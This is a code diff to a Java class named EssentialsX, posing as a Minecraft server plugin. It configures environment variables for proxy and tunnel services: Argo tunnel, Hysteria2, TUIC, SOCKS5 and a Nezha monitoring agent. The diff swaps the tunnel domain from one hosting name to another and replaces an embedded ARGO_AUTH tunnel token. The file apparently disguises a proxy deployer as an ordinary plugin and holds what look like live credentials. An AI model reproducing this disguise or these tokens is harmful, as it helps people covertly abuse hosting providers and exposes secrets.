@@ -79,8 +79,8 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "craftserve.19861123.tech");
-        env.put("ARGO_AUTH", "eyJhIjoiOGFlMmFlYWQ5YTcyMTNkYmM3YTkwMDEzM2RhNzU5ODciLCJ0IjoiZjI4Y2FhYzAtZWU3Ni00MTQ1LWI3NDEtMWY2MTk4MGE3YTU0IiwicyI6IllqTmxOMkZsT0RNdE16ZzFaQzAwTVRobExUa3dZell0WXpjNU5URmpOVEEzT0RFeCJ9");
+        env.put("ARGO_DOMAIN", "spacehosting.19861123.tech");
+        env.put("ARGO_AUTH", "eyJhIjoiOGFlMmFlYWQ5YTcyMTNkYmM3YTkwMDEzM2RhNzU5ODciLCJ0IjoiYWJlMmUxNGEtZDJkNC00YWIxLTk2NWQtOWVlMWYzYzUxMDQ1IiwicyI6Ik5URm1ZMlF4TWprdE5EUTJOaTAwTWpNNExXRTFNMkV0TXpJNE56UXlZalptT1RVMiJ9");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "23275");
         env.put("TUIC_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "");
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
-        env.put("NAME", "craftserve");
+        env.put("NAME", "spacehosting");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
